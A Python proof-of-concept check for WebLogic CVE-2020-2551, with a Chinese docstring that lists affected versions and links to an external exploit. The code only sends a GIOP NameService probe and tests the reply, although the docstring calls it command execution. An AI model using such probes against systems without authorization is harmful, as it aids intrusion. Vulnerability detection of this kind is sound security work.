#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

"""
Weblogic CVE-2020-2551 IIOP协议反序列化RCE

Desc
    2020年1月14日，Oracle发布了大量安全补丁，涉及旗下产品（Databa se Server、Weblogic Server、Java SE、MySQL等）的334个漏洞,
    其中包括43个严重漏洞，CVSS评分均在在9.1以上。此次修补的漏洞数量达到历史最高，和2019年7月的数量一样。
    CVE-2020-2551中，未经授权的攻击者可以利用Internet Inter-ORB Protocol(互联网内部对象请求代理协议)从而接管WebLogic服务器。
    CVE-2020-2546中，未经授权的攻击者则通过构造T3协议请求，绕过WebLoig的反序列化黑名单，从而接管WebLogic服务器。
    CVE-2020-2555中，未经授权的攻击者则通过构造T3协议请求，绕过WebLoig的反序列化黑名单，从而接管WebLogic服务器。
Version(同cve-2019-2725)
    WebLogic 10.3.6.0.0
    WebLogic 12.1.3.0.0
    WebLogic 12.2.1.3.0
    WebLogic 12.2.1.4.0
Type
    有回显命令执行
Usage

Referer
    漏洞利用exp: https://github.com/Y4er/CVE-2020-2551
    https://y4er.com/post/weblogic-cve-2020-2551/
    https://nosec.org/home/detail/3969.html
"""
import socket
import logging

def send_payload_by_socket(ip, port, data):
    sock=None
    res=None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(7)
        server_addr = (ip, int(port))
        sock.connect(server_addr)
        sock.send(data)
        res = sock.recv(20)
        if b'GIOP' in res:
            return True
    except Exception as e:
        logging.debug(e)
    finally:
        if sock!=None:
            sock.close()
    return False

def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0] + '/'
    dip = url.split('/')[2]
    if ':' in dip:
        dip, dport = dip.split(':')
    elif "https" in url:
        dport = 443
    else:
        dport = 80
    dport = int(dport)

    payload = "47494f50010200030000001700000002000000000000000b4e616d6553657276696365".decode('hex')
    if send_payload_by_socket(dip, dport, payload):
        return True
    else:
        return False

if __name__ == '__main__':
    print(poc("http://192.168.1.139:7001/"))


